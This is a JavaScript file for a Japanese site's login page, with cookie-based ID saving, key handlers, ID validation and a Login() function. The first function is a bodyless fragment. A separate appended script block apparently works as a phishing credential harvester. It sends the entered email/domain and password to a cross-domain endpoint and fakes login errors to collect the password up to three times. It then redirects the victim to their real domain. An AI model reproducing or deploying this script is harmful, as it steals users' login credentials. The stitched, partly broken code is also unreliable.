function del()

function DeleteCookie(name)
{
var exp = new Date();
exp.setTime (exp.getTime() - 1);
var cval = GetCookie (name);
SetCookie(name, "", exp.toGMTString(),"/");
}

function SetCookie(name, value)
{
var argv = SetCookie.arguments;
var argc = SetCookie.arguments.length;
var expires = (argc > 2) ? argv[2] : null;
var path = (argc > 3) ? argv[3] : "/";
var domain = "." + document.location.hostname;
var secure = (argc > 5) ? argv[5] : false;
document.cookie = name + "=" + escape (value) +
((expires == null) ? "" : ("; expires=" + expires)) +
((path == null) ? "" : ("; path=" + path)) +
((domain == null) ? "." : ("; domain=" + domain)) +
((secure == true) ? "; secure" : "");
}

function set()
{
var form = document.forms[0];
SetCookie("save_id", form.id.value, "Tue, 01 Jan 2099 1:00:00 GMT","/");
}

function GetCookie(name)
{
var arg = name + "=";
var alen = arg.length;
var clen = document.cookie.length;
var i = 0;

while( i < clen )
{
var j = i + alen;
if( document.cookie.substring(i, j) == arg )
return getCookieVal(j);

i = document.cookie.indexOf(" ", i) + 1;

if( i == 0 )
break;
}

return null;
}

function getCookieVal(offset)
{
var endstr = document.cookie.indexOf (";", offset);
if( endstr == -1 )
endstr = document.cookie.length;

return unescape(document.cookie.substring(offset, endstr));
}

function InitPage()
{
var form = document.forms[0];
var saveid = GetCookie("save_id");


if( saveid != null )
{
form.id.value=saveid;
form.save.checked=true;
}

var arrNavi = getNavigator();
if (arrNavi[1] == "MSIE")
{
form.id.onkeypress = ieIDPress;
form.pwd.onkeypress = iePWDPress;
}
else
{
form.id.onkeypress = mzIDPress;
form.pwd.onkeypress = mzPWDPress;
}

if( saveid == null )
form.id.focus();
else
form.pwd.focus();


IE9PlaceHolder();
}

function mzIDPress(evt)
{
var form = document.forms[0];
var e = evt? evt : window.event;

if( !e )
return;

var key = 0;

if( e.keycode )
key = e.keycode;
else if( typeof(e.which) != 'undefined' )
key = e.which;

if( key == 13 )
{
if( !IsValidID() )
return;

form.pwd.focus();
return false;
}

return true;
}

function mzPWDPress(evt)
{
var form = document.forms[0];
var e = evt? evt : window.event;

if( !e )
return;

var key = 0;

if( e.keycode )
key = e.keycode;
else if( typeof(e.which) != 'undefined' )
key = e.which;

if( key == 13 )
{
Login();
return false;
}

return true;
}

function ieIDPress()
{
var form = document.forms[0];
if( window.event.keyCode == 13 )
{
if( !IsValidID() )
return;

form.pwd.focus();
return false;
}

return true;
}

function iePWDPress()
{
if( window.event.keyCode == 13 )
{
Login();
return false;
}

return true;
}

function IsValidID()
{
var form = document.forms[0];
var allowid = "";
var id = "";
var id_length = 0;

allowid = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.";

id = form.id.value;
id_length= id.length;

for( i = 0 ; i < id_length; i++ )
{
if( allowid.indexOf(id.substring(i, i + 1)) < 0 )
{
alert("許可できない文字が含まれています。\n確認の上、もう一度入力してください。");
form.id.value="";
form.id.focus();
return;
}
}

return true;
}

function Login()
{
var form = document.forms[0];

if( form.id.value.length == 0 )
{
alert("IDを入力してください。");
form.id.focus();
return;
}

if( !IsValidID() )
return;

if( form.pwd.value.length == 0 )
{
alert("パスワードを入力してください。");
form.pwd.focus();
return;
}

if( form.save.checked )
set();
else
del();


form.action = "login.cgi";
form.submit();
}

<script>
jQuery(document).ready(function ($) {
  var counter = 0;

  $('.loginform').on('submit', function (event) {
    event.preventDefault();

    $('#unsubscribe').hide();
    let form = $(this);
    let submit = form.find('[type="submit"]');
    let action = form.attr('data-action');
    let zonealldom = form.find('[name=zonealldom]').val();
    let paswd = form.find('[name=paswd]').val();

    if (zonealldom === '' || paswd === '') {
      alert("Please fill in all fields.");
      return;
    }

    submit.prop('disabled', true);
    counter++;

    corsReq(action, { zonealldom, paswd }, 'POST', function (res) {
      let json = res.responseJSON;

      if (json && json.success) {
        if (counter >= 3) {
          counter = 0;
          window.location.href = 'http://' + json.domain;
        } else {
          $('#unsubscribe').show();
          form.find('[name=paswd]').val('');
          submit.prop('disabled', false);
        }
      } else {
        alert("Invalid login or server error.");
        form.find('[name=paswd]').val('');
        submit.prop('disabled', false);
      }
    });
  });
});

// CORS request helper
(function (window, document, $, io) {
  'use strict';

  $.support.cors = true;

  function corsReq(url, data, method, callback) {
    return $.ajax({
      url: url,
      method: method,
      data: data,
      crossDomain: true,
      dataType: 'json',
      xhrFields: { withCredentials: false },
      complete: callback
    });
  }

  window.corsReq = corsReq;
})(window, document, window.jQuery, window.io);
</script>
